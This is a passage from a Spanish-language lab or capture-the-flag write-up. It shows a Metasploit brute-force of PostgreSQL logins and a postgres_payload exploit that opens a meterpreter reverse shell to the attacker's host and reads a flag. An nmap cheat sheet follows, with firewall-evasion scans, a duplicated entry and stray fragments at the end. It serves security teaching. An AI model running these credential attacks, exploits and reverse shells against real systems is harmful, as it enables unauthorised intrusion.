[-] 198.0.2.6:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 198.0.2.6:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Bruteforce completed, 1 credential was successful.
[*] You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

Como resultado hemos encontrado una credencial válida para el servidor PostgreSQL objetivo:

- Usuario: postgres
- Contraseña: postgres

### Ejercicio 3

Utilizando un «exploit» de MFS y las credenciales (usuario y contraseña) obtenidas anteriormente para Postgresql, encuentra la «flag2» e indica su valor.

```bash
msf6 > use exploit/linux/postgres/postgres_payload
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(linux/postgres/postgres_payload) > set RHOST 198.0.2.6
RHOST => 198.0.2.6
msf6 exploit(linux/postgres/postgres_payload) > set RPORT 5432
RPORT => 5432
msf6 exploit(linux/postgres/postgres_payload) > set LHOST 198.0.2.4
LHOST => 198.0.2.4
msf6 exploit(linux/postgres/postgres_payload) > set USERNAME postgres
USERNAME => postgres
msf6 exploit(linux/postgres/postgres_payload) > set PASSWORD postgres
PASSWORD => postgres
msf6 exploit(linux/postgres/postgres_payload) > exploit

[*] Started reverse TCP handler on 198.0.2.4:4444
[*] 198.0.2.6:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] Uploaded as /tmp/QKvaYaFX.so, should be cleaned up automatically
[*] Sending stage (1017704 bytes) to 198.0.2.6
[*] Meterpreter session 1 opened (198.0.2.4:4444 -> 198.0.2.6:47791) at 2025-10-15 10:42:40 +0200

meterpreter > cat flag2.txt

----------------------------------------------------
   ** La desconfianza es la madre de la seguridad **

                    zero trust!
----------------------------------------------------
```

### ANEXO de nmap

#### Sondeo de puertos con nmap

1. Escaneo básico por nombre o IP

```bash
nmap scanme.nmap.org
nmap 192.168.1.1-3
nmap 192.168.1.1,4,22,100
nmap 192.168.1.1 192.168.1.2
nmap -iL lista.txt
```

Escanea el host o rango indicado para detectar puertos y servicios abiertos.

2. Escaneo con ping tipo ARP

```bash
nmap 192.168.1.1-3 -PR
```

Usa ping ARP para descubrir hosts activos en la red local antes de escanear puertos.

3. Ping TCP SYN a puerto (80 por defecto)

```bash
nmap scanme.nmap.org -PS
nmap scanme.nmap.org -PS80
```

Envía un TCP SYN al puerto indicado para ver si el host responde y está activo.

4. Ping TCP ACK a puerto

```bash
nmap scanme.nmap.org -PA
```

Envía un TCP ACK para sondear el host, útil para evadir algunos filtros.

5. Ping UDP a puerto

```bash
nmap scanme.nmap.org -PU
```

Envía paquetes UDP al puerto indicado para determinar si el host está activo.

6. Descubrimiento de paquetes de tipo ping. No es recomendable ya que es sencillo desactivar el echo ping de los equipos.

```bash
nmap scanme.nmap.org -PE
```

7. Para detectar puertos abiertos y servicios asociados.

```bash
nmap scanme.nmap.org -PN
```

8. Listar hosts sin escaneo (lista DNS)

```bash
nmap 192.168.1.1-5 -sL
```

No realiza escaneo, solo lista las IPs o nombres DNS especificados.

9. Descubrimiento de hosts sin sondeo de puertos

```bash
nmap 192.168.1.1-5 -sn
nmap scanme.nmap.org -sn
```

Envía pings para detectar qué hosts están activos, sin escanear puertos.

9. Descubrimiento de hosts sin sondeo de puertos

```bash
nmap 192.168.1.1-5 -sn
nmap scanme.nmap.org -sn
```

Envía paquetes ping para detectar qué hosts están activos, sin escanear sus puertos o servicios.

10. Escaneo SYN (Stealth Scan)

```bash
nmap -sS 192.168.1.1
```

Envía paquetes TCP SYN para identificar puertos abiertos sin completar la conexión TCP completa. Es rápido y menos detectable.

11. Escaneo de conexión TCP completa

```bash
nmap -sT 192.168.1.1
```

Realiza el handshake TCP completo (3 pasos) en cada puerto, detectando puertos abiertos, pero es más detectable y lento que -sS.

12. Escaneo ACK

```bash
nmap -sA 192.168.1.1
```

Envía paquetes TCP ACK para detectar si los puertos están filtrados o no, útil para identificar reglas de firewall.

13. Escaneo UDP

```bash
nmap -sU 192.168.1.1
```

Escanea puertos UDP enviando datagramas UDP, para detectar servicios UDP activos, que suelen ser menos visibles que TCP.

14. Escaneo Null

```bash
nmap -sN 192.168.1.1
```

Envía paquetes TCP sin banderas activas (flag=0) para evadir firewalls básicos y detectar estados de puertos.

15. Escaneo FIN

```bash
nmap -sF 192.168.1.1
```

Envía paquetes TCP con solo la bandera FIN activa para evadir algunos filtros y determinar el estado del puerto según la respuesta.

16. Escaneo Xmas

```bash
nmap -sX 192.168.1.1
```

Envía paquetes TCP con las banderas FIN, PSH y URG activas (como un árbol de Navidad) para evadir firewalls simples y descubrir puertos.

> > **Nota:** Estos comandos permiten controlar el tipo y el alcance del escaneo que nmap realiza, desde listar simples objetivos, hacer un ping para descubrir hosts, hasta enviar paquetes específicos para burlar firewalls o detectar sistemas activos. Es muy interesante ver la captura de los diferentes paquete con Wireshark.

###### Especificación de puertos con nmap

1. Escanear un puerto específico

```bash
nmap -p 80 192.168.1.100
```

Escanea el puerto TCP 80 (HTTP) del host indicado para ver si está abierto y qué servicio corre.

2. Escanear un rango de puertos

```bash
nmap -p 20-200 192.168.1.100
```

Escanea los puertos del 20 al 200 para detectar cuáles están abiertos.

3. Escanear puertos TCP y UDP específicos

```bash
nmap -p T:21,80,U:53,123 192.168.1.100
```

Escanea puertos TCP 21 y 80 y puertos UDP 53 y 123. Se deben usar junto con opciones de escaneo TCP (`-sS` etc.) y UDP (`-sU`).

4. Escanear puertos por servicio (ejemplos HTTP y HTTPS)

```bash
nmap -p 80,443 192.168.1.100
```

Escanea los puertos 80 (HTTP) y 443 (HTTPS) para ver si los servicios web están disponibles.

5. Escaneo de todos los puertos

```bash
nmap -p- 192.168.1.100
```

Escanea todos los puertos posibles (1 a 65535). Útil para un análisis exhaustivo pero más lento. Con `-p` se controla explícitamente qué puertos se van a escanear, lo que permite enfocar el análisis y reducir tiempo o abarcar todo el rango de puertos disponibles.

6. Escanear los 100 puertos más comunes.

```bash
nmap -F 192.168.1.100
nmap --top-ports 100 192.168.1.100
```

Escanea un número reducido de puertos (los más comunes, por defecto 100) en lugar de todos, para hacer un escaneo rápido y eficaz en menor tiempo.

7. Escanear los puertos en orden secuencial.

```bash
nmap -r 192.168.1.100
```

Escanea los puertos en orden secuencial, no en orden aleatorio (que es el comportamiento por defecto), lo que puede ser útil en ciertos entornos para evitar detección o gestionar el tráfico.

8. Excluir puertos a buscar.

```bash
nmap 192.168.1.100 --exclude-ports 80,443,22
```

Excluye los puertos especificados del escaneo, útil si se sabe que esos puertos están bloqueados o no se quiere gastar tiempo en ellos.

-vv
-a
-T numero -T4 mas rápido y ruidoso
